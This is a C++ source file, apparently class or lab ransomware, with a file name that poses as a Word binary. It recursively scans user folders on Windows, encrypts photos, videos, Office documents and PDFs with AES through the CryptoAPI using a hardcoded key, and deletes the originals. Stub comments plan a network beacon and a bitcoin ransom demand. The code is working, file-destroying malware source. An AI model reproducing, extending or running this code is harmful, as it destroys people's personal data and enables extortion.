// winword64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <fstream>
#include <string>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <wincrypt.h>


namespace fs = std::experimental::filesystem;

#define CLASSNAME = "uwbcss579";
#define BLOCK_LEN 128;


bool ExcludePath(std::string checkString)
{
	std::string AppData = "AppData";
	std::string AllUsers = "All Users";
	std::string Public = "Public\\AccountPictures";

	if (checkString.find(AppData) != std::string::npos)
	{
		// Exclude files in the AppData directory
		return true;
	}
	else if (checkString.find(AllUsers) != std::string::npos)
	{
		// Exclude files in the All Users directory
		return true;
	}
	else if (checkString.find(Public) != std::string::npos)
	{
		// Exclude files in the Public\AccountPictures directory
		return true;
	}
	else
	{
		// Do not exclude this path
		return false;
	}
}

bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key)
{

	// Note: the param key is not used anywhere - it is a false flag

	wchar_t keyDefault[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; 
	wchar_t* keyString = keyDefault;
	DWORD keyLength = lstrlenW(keyString);

	LPCWSTR inputFile = std::wstring(fileToEncrypt.begin(), fileToEncrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();

	//std::cout << "-------------------------" << std::endl;
	std::wcout << "Key:         " << keyDefault << std::endl;
	std::cout << "Key (addr):  " << keyString << std::endl;
	std::cout << "Key length:  " << keyLength << std::endl;
	std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
	std::cout << "Output file: " << fileEncrypted.c_str() << std::endl;
	//std::cout << "-------------------------" << std::endl;


	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE) 
	{
		std::cout << "Cannot open input file!" << std::endl;

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE) 
	{
		std::cout << "Cannot open output file!" << std::endl;

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) 
	{
		dwStatus = GetLastError();
		//std::cout << "CryptAcquireContext failed: " << dwStatus << std::endl;
		std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash)) 
	{
		dwStatus = GetLastError();
		//std::cout << "CryptCreateHash failed: " << dwStatus << std::endl;
		std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0)) 
	{
		DWORD err = GetLastError();
		//std::cout << "CryptHashData failed: " << dwStatus << std::endl;
		std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		return false;
	}
	//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey)) 
	{
		dwStatus = GetLastError();
		std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//std::cout << "CryptDeriveKey Success! " << std::endl;
		
	const size_t chunkSize = BLOCK_LEN;
	BYTE chunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);

	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL)) 
	{
		if (0 == outputLength) 
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize) 
		{
			isFinal = TRUE;
			//std::cout << "Final chunk set." << std::endl;
			std::cout << "Finalizing encrypted data file." << std::endl;
		}

		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize)) 
		{
			std::cout << "CryptEncrypt failed :(" << std::endl;
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL)) 
		{
			std::cout << "WriteFile(output file) failed :(" << std::endl;
			break;
		}

		memset(chunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return true;
}

bool EncryptAndDeleteThisFile(std::string path)
{
	std::cout << "Encrypting " << path << " ..." << std::endl;

	bool fEncrypted = false;
	bool fDeleted = false;

	std::string pathEncrypted = path;
	pathEncrypted.append(".encrypted");

	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");

	std::cout << "Encrypt result: " << fEncrypted << std::endl;
	
	fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
	if (!fDeleted)
	{
		DWORD dwStatus;
		dwStatus = GetLastError();
		std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
	}
	else
	{
		std::cout << "Delete result:  " << fDeleted << std::endl;
	}

	std::cout << std::endl;

	if (fEncrypted)
		return true;
	else
		return false;
}


DWORD FindFiles()
{
	// Get system drive

	DWORD dwFileCounter = 0;
	DWORD dwEncryptionCounter = 0;

	// File extension filters to target important files
	// Lowercase extenstions
	const std::string bmp = ".bmp";
	const std::string jpg = ".jpg";
	const std::string jpeg = ".jpeg";
	const std::string png = ".png";
	const std::string gif = ".gif";
	const std::string mp4 = ".mp4";
	const std::string mpg = ".mpg";
	const std::string mpeg = ".mpeg";
	const std::string mov = ".mov";
	const std::string mp3 = ".mp3";
	const std::string doc = ".doc";
	const std::string docx = ".docx";
	const std::string xls = ".xls";
	const std::string xlsx = ".xlsx";
	const std::string ppt = ".ppt";
	const std::string pptx = ".pptx";
	const std::string pdf = ".pdf";

	// Uppercase extenstions
	const std::string BMP = ".BMP";
	const std::string JPG = ".JPG";
	const std::string JPEG = ".JPEG";
	const std::string PNG = ".PNG";
	const std::string GIF = ".GIF";
	const std::string MP4 = ".MP4";
	const std::string MPG = ".MPG";
	const std::string MPEG = ".MPEG";
	const std::string MOV = ".MOV";
	const std::string MP3 = ".MP3";
	const std::string DOC = ".DOC";
	const std::string DOCX = ".DOCX";
	const std::string XLS = ".XLS";
	const std::string XLSX = ".XLSX";
	const std::string PPT = ".PPT";
	const std::string PPTX = ".PPTX";
	const std::string PDF = ".PDF";


	std::string path = "c:\\users";
	//std::string temp;

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path 
		}
		
		if (entry.path().extension()==jpg ||
			entry.path().extension() == jpeg ||
			entry.path().extension() == png ||
			entry.path().extension() == gif ||
			entry.path().extension() == mp4 ||
			entry.path().extension() == mpg ||
			entry.path().extension() == mpeg ||
			entry.path().extension() == mov ||
			entry.path().extension() == mp3 ||
			entry.path().extension() == bmp ||
			entry.path().extension() == doc ||
			entry.path().extension() == docx ||
			entry.path().extension() == xls ||
			entry.path().extension() == xlsx ||
			entry.path().extension() == ppt ||
			entry.path().extension() == pptx ||
			entry.path().extension() == pdf ||
			entry.path().extension() == JPG ||
			entry.path().extension() == JPEG ||
			entry.path().extension() == PNG ||
			entry.path().extension() == GIF ||
			entry.path().extension() == MP4 ||
			entry.path().extension() == MPG ||
			entry.path().extension() == MPEG ||
			entry.path().extension() == MOV ||
			entry.path().extension() == MP3 ||
			entry.path().extension() == BMP ||
			entry.path().extension() == DOC ||
			entry.path().extension() == DOCX ||
			entry.path().extension() == XLS ||
			entry.path().extension() == XLSX ||
			entry.path().extension() == PPT ||
			entry.path().extension() == PPTX ||
			entry.path().extension() == PDF)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Encrypt file
			if (EncryptAndDeleteThisFile(entry.path().string()))
			{
				dwEncryptionCounter++;
			}
		}
	}

	std::cout << "Total files found:     " << dwFileCounter << std::endl;
	std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;

	return dwFileCounter;
}


int main()
{
    std::cout << "Welcome to T.R.O.U.B.L.E.\n"; 

	// Decode library strings

	// Load necessary libraries via LoadLibrary

	// Find files to encrypt 
	// documents (doc, docx, pdf, xls, ppt, etc)
	// images (jpg, png, etc)
	// video (mp4, mpg, etc)
	FindFiles(); // Finds, Encrypts, and Deletes important personal files

	// Send network beacon to report ransom completed

	// Display message to user demanding bitcoin payment 

	// Do we care about providing a decryption option?

	std::cout << std::endl;
	std::cout << "All Your Files Are Belong To Us!!! :\\" << std::endl;

}
